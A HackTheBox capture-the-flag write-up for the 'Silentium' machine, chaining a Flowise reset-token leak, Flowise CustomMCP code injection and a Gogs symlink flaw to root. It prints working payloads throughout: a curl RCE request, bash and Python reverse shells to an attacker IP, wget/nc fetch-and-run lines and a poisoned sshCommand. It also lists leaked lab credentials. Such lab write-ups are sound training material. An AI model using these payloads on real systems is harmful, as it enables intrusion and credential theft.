# Silentium — HackTheBox Writeup

**OS:** Linux  
**Difficulty:** Medium  
**IP:** 10.129.114.95

---

## Reconnaissance

### Port Scan

```bash
nmap -sCV 10.129.114.95
```

![[Pasted image 20260922184520.png]]

Two ports open:
- **22/tcp** — OpenSSH 9.6p1 (Ubuntu)
- **80/tcp** — nginx 1.24.0, redirecting to `http://silentium.htb/`

Added the host to `/etc/hosts`:

```
10.129.114.95   Silentium.htb staging.silentium.htb
```

![[Pasted image 20260922184622.png]]

### Web Enumeration

Visiting `silentium.htb` shows a fictional institutional finance company called **Silentium**. Scrolling the landing page reveals an "Institutional Leadership" section listing three employees: **Marcus Thorne** (Managing Director), **Ben** (Head of Financial Systems), and **Elena Rossi** (Chief Risk Officer). Ben becomes a useful username candidate.

![[Pasted image 20260922184646.png]]

![[Pasted image 20260922185817.png]]

### Subdomain Fuzzing

```bash
ffuf -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' \
  -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

![[Pasted image 20260922184722.png]]

Discovered subdomain: **`staging.silentium.htb`**

### API Endpoint Discovery

```bash
ffuf -u http://silentium.htb/FUZZ \
  -w SecLists/Discovery/Web-Content/api/api-endpoints.txt
```

![[Pasted image 20260922185059.png]]

Multiple API endpoints return 200 with the same size — likely a SPA frontend returning the index on all routes. The interesting one is `/api/v1/version`.

### Service Fingerprinting

```bash
curl -I http://staging.silentium.htb
curl http://staging.silentium.htb/api/v1/version
```

![[Pasted image 20260922185455.png]]

![[Pasted image 20260922185523.png]]

The version endpoint returns:

```json
{"version":"3.0.5"}
```

This identifies the staging app as **Flowise 3.0.5**.

### Vulnerability Research — Flowise 3.0.5

![[Pasted image 20260922185603.png]]

Searching for known CVEs against Flowise 3.0.5 reveals three critical issues:

- **CVE-2025-59528** — Critical RCE (CVSS 10.0): The `CustomMCP` node evaluates user input through the insecure `Function()` constructor in `convertToValidJSONString`, allowing arbitrary Node.js code execution.
- **CVE-2025-58434** — Account Takeover / Token Disclosure (CVSS 9.8): The `forgot-password` endpoint returns a valid `tempToken` in the API response without requiring authentication, enabling full account takeover.
- **CVE-2025-59527** — SSRF: The `/api/v1/fetch-links` endpoint lacks URL validation.

---

## Initial Access — Flowise Account Takeover (CVE-2025-58434)

The staging app at `staging.silentium.htb` presents a **Sign In** page with a "Forgot password?" link that leads to a token-based reset form.

![[Pasted image 20260922185300.png]]

![[Pasted image 20260922185313.png]]

### CVE-2025-58434 Details

![[Pasted image 20260922195933.png]]

The `/api/v1/account/forgot-password` endpoint accepts an email and responds directly with sensitive user data including the `tempToken` — no email is sent, and no authentication is required. This token can then be used at `/api/v1/account/reset-password` to set a new password without any verification.

Using **Ben** as the identified employee name, the target email is `ben@silentium.htb`.

Sending the forgot-password request and intercepting the response:

![[Pasted image 20260922195902.png]]

The JSON response reveals:
- `name`: admin
- `email`: ben@silentium.htb
- `credential`: bcrypt hash
- `tempToken`: a valid reset token
- `tokenExpiry`: 2026-09-22T19:09:18.913Z

Using the `tempToken` at the reset endpoint successfully resets Ben's password, granting access to the Flowise admin dashboard.

---

## Remote Code Execution — Flowise CustomMCP (CVE-2025-59528)

### CVE-2025-59528 Background

![[Pasted image 20260922234629.png]]

Flowise can act as a client to external tool servers over MCP (Model Context Protocol), and the `CustomMCP` node is where the operator types the configuration for one of those servers. The vulnerability exists in the `convertToValidJSONString` function, which passes user input directly to the `Function()` constructor — executing it as JavaScript with full Node.js runtime privileges, including access to `child_process` and `fs`.

**Vulnerability flow:**
1. User input is received via `/api/v1/node-load-method/customMCP` through `mcpServerConfig`
2. The `substituteVariablesInString` function replaces template variables with no security filtering
3. `convertToValidJSONString` calls `Function('return ' + inputString)()`, executing arbitrary code

### Exploit

With Ben's API token obtained after login, the exploit is sent via a `POST` to the customMCP endpoint.

**Initial PoC — write a file to confirm RCE:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
    }
  }'
```

![[Pasted image 20260922235719.png]]

The response says "No Available Actions" — but that's the expected Flowise error when the MCP config doesn't define valid actions. The command still executes server-side.

**Confirming OOB execution with ping:**

```bash
# listener
sudo tcpdump -ni tun0 icmp

# payload: ping -c 1 10.10.16.118
```

![[Pasted image 20260923000409.png]]

ICMP echo request received from `10.129.114.95` — RCE confirmed.

### Getting a Shell

**Attempt 1 — bash reverse shell (failed, bash not available or filtered):**

```bash
cp.execSync("bash -i >& /dev/tcp/10.10.16.118/443 0>&1")
```

![[Pasted image 20260923000733.png]]

![[Pasted image 20260923000744.png]]

**Attempt 2 — netcat pipe (got a connection but no shell):**

```bash
cp.execSync("which nc 2>&1 | nc 10.10.16.118 443")
```

![[Pasted image 20260923001321.png]]

nc is available but piping directly didn't yield an interactive shell.

**Attempt 3 — Python reverse shell script via HTTP server:**

Wrote a Python reverse shell to `rev.py`:

```python
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.118",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("sh")
```

![[Pasted image 20260923002234.png]]

Served it via a Python HTTP server and had the target fetch it:

```bash
# serve the file
sudo python3 -m http.server 80

# payload: wget 10.10.16.118/rev.py 2>&1 | nc 10.10.16.118 443
```

![[Pasted image 20260923004416.png]]

The HTTP server confirmed the target fetched `rev.py` successfully (200 OK).

**Triggering execution:**

```bash
# payload: python rev.py 2>&1 | ncat 10.10.16.118 443
```

![[Pasted image 20260923004400.png]]

![[Pasted image 20260923004524.png]]

**Shell received via ncat:**

![[Pasted image 20260923004548.png]]

Shell lands as root inside the Flowise Docker container (`10.129.114.95`).

---

## Post-Exploitation — Container Enumeration

### Environment Variables

```bash
env
```

![[Pasted image 20260923105038.png]]

Key findings from the container environment:

| Variable | Value |
|---|---|
| `FLOWISE_PASSWORD` | `F1l3_d0ck3r` |
| `FLOWISE_USERNAME` | `ben` |
| `SENDER_EMAIL` | `ben@silentium.htb` |
| `SMTP_PASSWORD` | `r04D!!_R4ge` |
| `SMTP_HOST` | `mailhog` |
| `DATABASE_PATH` | `/root/.flowise` |
| `JWT_AUTH_TOKEN_SECRET` | `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD` |

The `SMTP_PASSWORD` (`r04D!!_R4ge`) is a strong credential reuse candidate.

### Process Listing

From outside the container (or via the shell), inspecting the host process list reveals the full infrastructure:

![[Pasted image 20260923105054.png]]

Key processes:
- `root 1484` — `/opt/gogs/gogs/gogs web` — **Gogs** git service running as root
- `root 1921` — `node /usr/local/bin/flowise start` — Flowise running as root
- `ben 1914` — **MailHog** — internal mail server
- Two `containerd-shim` processes — Docker containers running (one is our Flowise container `c78c3c...`, another is `728f8f...`)

Gogs is running on the host at `/opt/gogs`. The container hostname (`c78c3cceb7ba`) matches the containerd shim ID.

### Pivot to Host — SSH with Leaked Credentials

The SMTP password `r04D!!_R4ge` works for SSH as user `ben`:

```bash
ssh ben@silentium.htb
```

![[Pasted image 20260923110604.png]]

Logged in as `ben@silentium`.

---

## Privilege Escalation — Gogs RCE (CVE-2025-8110)

### Discovering Gogs

Checking the host reveals **Gogs 0.13.3** running as root:

```bash
/opt/gogs/gogs/gogs -help
```

![[Pasted image 20260923111420.png]]

Gogs is accessible at `http://staging-v2-code.dev.silentium.htb` (nginx proxying to `127.0.0.1:3001`).

![[Pasted image 20260923112831.png]]

Checking the Gogs configuration at `/opt/gogs/gogs/custom/conf/app.ini`:

![[Pasted image 20260923115855.png]]

![[Pasted image 20260923120913.png]]

Key config details:
- `RUN_USER = root` — Gogs runs as root
- `DOMAIN = staging-v2-code.dev.silentium.htb`
- `DISABLE_SSH = false` — SSH is enabled
- `TYPE = sqlite3`, `PATH = /opt/gogs/data/gogs.db`

### CVE-2025-8110 Background

![[Pasted image 20260923120931.png]]

![[Pasted image 20260923122214.png]]

Gogs 0.13.3 is vulnerable to **CVE-2025-8110** — a symlink traversal in the `PutContents` API. An authenticated user can:

1. Push a commit containing a symlink pointing to any server-side file (e.g., `.git/config`)
2. Call the `PUT /api/v1/repos/.../contents/<symlink>` endpoint to overwrite the target file with attacker-controlled content
3. Inject a malicious `sshCommand` directive into `.git/config`
4. Trigger a git SSH operation — Gogs executes the injected command as root

### Exploit

![[Pasted image 20260923122302.png]]

![[Pasted image 20260923122630.png]]

Used the exploit script (modified for existing user `lalo` / `Admin.123`) targeting `http://staging-v2-code.dev.silentium.htb`:

```bash
python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb \
  -lh 10.10.16.244 -lp 443
```

![[Pasted image 20260923125338.png]]

The exploit:
1. Authenticated as `lalo`
2. Generated an API application token
3. Created a new repository
4. Cloned it locally, created `malicious_link → .git/config`, committed and pushed
5. Used `PUT /api/v1/repos/lalo/<repo>/contents/malicious_link` to overwrite the real `.git/config` with a poisoned config containing:

```ini
[core]
    sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.16.244/443 0>&1'
```

The PUT request timed out — Gogs executed the `sshCommand` during the write, triggering the reverse shell back to our listener. Since Gogs runs as root, the shell lands as **root**.

---

## Summary

| Step | Technique | CVE |
|---|---|---|
| Recon | nmap, ffuf subdomain + endpoint fuzzing | — |
| Username enumeration | Employee names on landing page | — |
| Account takeover | Flowise forgot-password token leak | CVE-2025-58434 |
| RCE on container | Flowise CustomMCP `Function()` injection | CVE-2025-59528 |
| Credential reuse | `SMTP_PASSWORD` from container env → SSH as ben | — |
| Root shell | Gogs symlink traversal + sshCommand injection | CVE-2025-8110 |
